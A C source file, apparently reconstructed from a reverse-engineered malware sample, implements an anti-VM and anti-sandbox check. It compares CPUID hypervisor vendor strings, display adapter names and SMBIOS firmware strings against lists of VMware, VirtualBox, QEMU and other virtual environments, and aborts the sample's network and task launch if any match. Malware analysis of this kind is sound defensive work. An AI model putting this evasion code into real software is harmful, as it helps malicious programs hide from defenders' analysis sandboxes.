/* ============================================================
 * Capacidad 05/15 — Anti VM y anti sandbox
 * Función C : IsVirtualizedOrSandboxed
 * Dirección : 0x180047f22   · Nodo N2   · Confianza: Media
 * ------------------------------------------------------------
 * Comprobaciones previas al lanzamiento de red y tareas. Usa CPUID
 * para leer el proveedor de hipervisor, y revisa adaptador gráfico y
 * firmware SMBIOS. Los proveedores comparados incluyen VMware,
 * VirtualBox, KVM, Xen, Hyper-V y similares. Si coincide, el
 * controlador aborta.
 * ============================================================
 */

#include "00_tipos_comunes.h"
#include <intrin.h>

/* Marcas de hipervisor comparadas (CPUID.40000000h) [condicionado]. */
static const char *const KNOWN_HYPERVISORS[] = {
    "VMwareVMware",      /* VMware          */
    "VBoxVBoxVBox",      /* VirtualBox      */
    "KVMKVMKVM",         /* KVM             */
    "XenVMMXenVMM",      /* Xen             */
    "Microsoft Hv",      /* Hyper-V         */
    "TCGTCGTCGTCG",      /* QEMU            */
    "Parallels",         /* Parallels       */
    NULL
};

/* ------------------------------------------------------------------
 * CPUID hoja 0x40000000 -> cadena de proveedor de hipervisor en
 * EBX:ECX:EDX (12 bytes). Devuelve true si coincide con la lista.
 * ------------------------------------------------------------------ */
static bool HypervisorVendorMatchesKnownList(void)
{
    int regs[4] = { 0, 0, 0, 0 };
    __cpuidex(regs, 0x40000000, 0);

    char vendor[13] = { 0 };
    CopyMemory(vendor + 0, &regs[1], 4);   /* EBX */
    CopyMemory(vendor + 4, &regs[2], 4);   /* ECX */
    CopyMemory(vendor + 8, &regs[3], 4);   /* EDX */

    if (vendor[0] == '\0')
        return false;

    for (int i = 0; KNOWN_HYPERVISORS[i] != NULL; i++) {
        if (strncmp(vendor, KNOWN_HYPERVISORS[i], 12) == 0)
            return true;
    }
    return false;
}

/* ------------------------------------------------------------------
 * Revisa el adaptador gráfico (nombre/descripción del dispositivo de
 * pantalla) en busca de controladores virtuales típicos.
 * ------------------------------------------------------------------ */
static bool DisplayAdapterLooksVirtual(void)
{
    static const char *const VIRTUAL_GPU[] = {
        "VirtualBox", "VMware", "QXL", "VirtIO", "Hyper-V", NULL
    };

    DISPLAY_DEVICEA dd;
    ZeroMemory(&dd, sizeof(dd));
    dd.cb = sizeof(dd);

    for (DWORD i = 0; EnumDisplayDevicesA(NULL, i, &dd, 0); i++) {
        for (int k = 0; VIRTUAL_GPU[k] != NULL; k++) {
            if (strstr(dd.DeviceString, VIRTUAL_GPU[k]) != NULL)
                return true;
        }
    }
    return false;
}

/* ------------------------------------------------------------------
 * Revisa el firmware SMBIOS (tabla 'RSMB') en busca de fabricantes o
 * cadenas asociadas a entornos virtualizados.
 * ------------------------------------------------------------------ */
static bool SmbiosLooksVirtualized(void)
{
    static const char *const VIRTUAL_BIOS[] = {
        "VMware", "VirtualBox", "innotek", "Xen", "QEMU", "BHYVE", NULL
    };

    UINT  smbios_size = GetSystemFirmwareTable('RSMB', 0, NULL, 0);
    if (smbios_size == 0)
        return false;

    BYTE *smbios = (BYTE *)HeapAlloc(GetProcessHeap(), 0, smbios_size);
    if (smbios == NULL)
        return false;

    GetSystemFirmwareTable('RSMB', 0, smbios, smbios_size);

    bool found = false;
    /* Barrido ligero de cadenas sobre la tabla SMBIOS completa. */
    for (int k = 0; VIRTUAL_BIOS[k] != NULL && !found; k++) {
        size_t needle = strlen(VIRTUAL_BIOS[k]);
        if (needle == 0)
            continue;
        for (UINT i = 0; i + needle <= smbios_size; i++) {
            if (memcmp(smbios + i, VIRTUAL_BIOS[k], needle) == 0) {
                found = true;
                break;
            }
        }
    }

    HeapFree(GetProcessHeap(), 0, smbios);
    return found;
}

/* ------------------------------------------------------------------
 * 0x180047f22 — decisión previa al lanzamiento de red y tareas.
 * Si coincide cualquiera de las comprobaciones, el controlador aborta.
 * ------------------------------------------------------------------ */
bool IsVirtualizedOrSandboxed(void)
{
    if (HypervisorVendorMatchesKnownList())   /* CPUID.40000000h */
        return true;

    if (DisplayAdapterLooksVirtual())         /* adaptador gráfico virtual */
        return true;

    if (SmbiosLooksVirtualized())             /* firmware / SMBIOS virtual */
        return true;

    return false;   /* entorno considerado "real" -> continuar */
}
